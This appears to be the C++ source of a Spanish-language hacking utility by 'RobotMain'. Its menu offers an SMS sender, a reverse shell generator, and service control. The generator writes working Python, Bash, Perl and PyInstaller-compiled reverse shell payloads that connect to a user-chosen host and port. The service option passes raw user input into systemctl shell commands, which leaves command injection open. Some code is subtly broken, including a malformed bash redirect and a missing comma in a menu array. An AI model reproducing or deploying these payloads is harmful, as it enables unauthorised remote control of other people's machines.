#include<iostream>
#include<stdlib.h>
#include<string>
#include<fstream>
#include<sstream>
#include<cstdlib>

using namespace std;

class Ban{
    private:
    	string creador;
    	string version;
    public:
    	Ban(string, string);
    	void funtion_banner();
};
Ban::Ban(string creador_, string version_){
	creador=creador_;
	version=version_;
}
void Ban::funtion_banner(){
	system("cat ./banner/banner.txt");
	cout<<creador<<endl;
	cout<<version<<endl;
}

int funtion_menu(){
	string menus[]={"[1] SendSmS", "[2] reverse shell generator", "[3] listar servicios", "[4] Encender o apagar servicio","[0] Salir"};
	size_t res= sizeof(menus)/sizeof(string);	
	for(int i=0; i<res;i++){
		cout<<menus[i]<<endl;
	}
	return 0;
}
int funtion_start_sms(){
	system("rlwrap bash ./bash/sms.sh");
	return 0;
}
int funtion_select_type_exploit(){
	string exp[]={"[1] python", "[2] BASH","[3] COMPILADO", "[4] PERL" "[0]Volver"};
	size_t more = sizeof(exp)/sizeof(string);
	for(int i=0; i<more;i++){
		cout<<exp[i]<<endl;
	}
	return 0;
}
/*Generadores===
*/


int main(){
	Ban p1 = Ban("creador: RobotMain", "version: 1.0");
	p1.funtion_banner();
	funtion_menu();
	int select;
	cout<<"Seleccion> ";cin>>select;
	if(select==1){
		funtion_start_sms();
	}else{
		if(select==2){
			funtion_select_type_exploit();
			int ex;
			cout<<"rev_shell_select> ";cin>>ex;
			string name_a;
			string dir_a;
			string port_a;
			cout<<"NAME FOR THE FILE: ";cin>>name_a;
			cout<<"ADDRESS: ";cin>>dir_a;
			cout<<"PORT: "; cin>>port_a;
			if(ex==1){
				cout<<"[*] Generando reverse shell PYTHON"<<endl;
				system("sleep 2");
				ofstream file;
				file.open(name_a);
				file<<"import socket"<<endl;
				file<<"import subprocess"<<endl;
				file<<"host=\""<<dir_a<<"\""<<endl;
				file<<"port="<<port_a<<endl;
				file<<"sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)"<<endl;
				file<<"sock.connect((host, port));"<<endl;
				file<<"more=sock.fileno()"<<endl;
				file<<"subprocess.run([\'/bin/bash\', \'-i\'], stdin=more, stdout=more, stderr=more)"<<endl;
				file.close();
				cout<<"[-] Proceso finalizado, guardado en la ruta actual"<<endl;
			}else{
				if(ex==2){
					cout<<"[*] Generando reverse shell BASH"<<endl;
					system("sleep 2");
					ofstream filer;
					filer.open(name_a);
					filer<<"bash -i >& /dev/tcp/"<<dir_a<<"/"<<port_a<<"0>&1"<<endl;
					filer.close();
					cout<<"[-] Proceso finalizado, guardado en la ruta actual"<<endl;
				}else{
					if(ex==3){
						cout<<"[*] Generando reverse shell COMPILADO Linux"<<endl;
						system("sleep 2");
						ofstream file;
						file.open(name_a);
						file<<"import socket"<<endl;
						file<<"import subprocess"<<endl;
						file<<"host=\""<<dir_a<<"\""<<endl;
						file<<"port="<<port_a<<endl;
						file<<"sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)"<<endl;
						file<<"sock.connect((host, port));"<<endl;
						file<<"more=sock.fileno()"<<endl;
						file<<"subprocess.run([\'/bin/bash\', \'-i\'], stdin=more, stdout=more, stderr=more)"<<endl;
						file.close();
						stringstream comando;
						comando<<"pyinstaller --onefile "<<name_a;
						system(comando.str().c_str());
						stringstream comando2;
						comando2<<"mv ./dist/"<<name_a<<" .";
						system(comando2.str().c_str());
						stringstream comando3;
						comando3<<"rm -rf ./"<<name_a<<".spec";
						system(comando3.str().c_str());
						system("sleep 2");
						system("rm -rf build dist");

						cout<<"[-] Proceso finalizado, guardado en la ruta actual"<<endl;
					}else{
						if(ex==4){
							cout<<"Generando reverse shell PERL"<<endl;
							system("sleep 2");
							ofstream h;
							h.open(name_a);
							h<<"use Socket;"<<endl;
							h<<"$i=\""<<dir_a<<"\""<<endl;
							h<<"$p="<<port_a<<endl;
							h<<"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"<<endl;
							h<<"if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");"<<endl;
							h<<"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"<<endl;
							h.close();
							cout<<"[-] Proceso finalizado, guardado en la ruta actual"<<endl;
						}
					}
				}
			}
		}else{
			if(select==3){
				system("service --status-all");
			}else{
				if(select==4){
					string uu;
					string on;
					cout<<"Escribe el nombre del servicio: ";cin>>uu;
					cout<<"on or off";cin>>on;
					stringstream command;
					command<<"systemctl "<<"start "<<uu<<".service";
					stringstream commander;
					commander<<"systemctl "<<"stop "<<uu<<".service";
					if(on=="on"){
						system(command.str().c_str());
					}else{
						system(commander.str().c_str());
					}
				}
			}
		}
	}
	return 0;
}